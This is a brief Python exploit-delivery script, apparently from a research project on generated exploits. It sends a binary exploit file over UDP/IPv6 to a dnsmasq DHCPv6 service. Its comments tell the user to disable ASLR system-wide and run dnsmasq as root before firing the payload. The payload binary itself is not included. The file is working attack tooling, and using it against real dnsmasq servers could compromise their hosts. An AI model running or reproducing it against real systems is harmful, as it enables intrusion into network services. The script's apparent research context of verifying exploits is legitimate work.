#!/usr/bin/env python3

# This exploit script is currently manually written.
# It's used to verify the generated exploit(s) (exploit-*.bin).
#
# Usage
# -----
# # 1. Disable ASLR and run dnsmasq in foreground as root.
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# sudo env -i ./dnsmasq --no-daemon --dhcp-range=fd00::2,fd00::ff -p 5300
#
# # 2. In another terminal, run the exploit and send the exploit to dnsmasq.
# ./exploit.py ::1 547 exploit-7fffffffe958.bin

import sys
import socket

if __name__ == '__main__':
    assert len(sys.argv) == 4, "{} <ip> <port> <exploit.bin>".format(sys.argv[0])

    host = sys.argv[1]
    port = int(sys.argv[2])
    file = sys.argv[3]

    with open(file, 'rb') as f:
        exploit = f.read()

    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    s.sendto(exploit, (host, port))
    s.close()

    print('Exploit sent. Remember to disable ASLR and run dnsmasq as root in another terminal first :)')
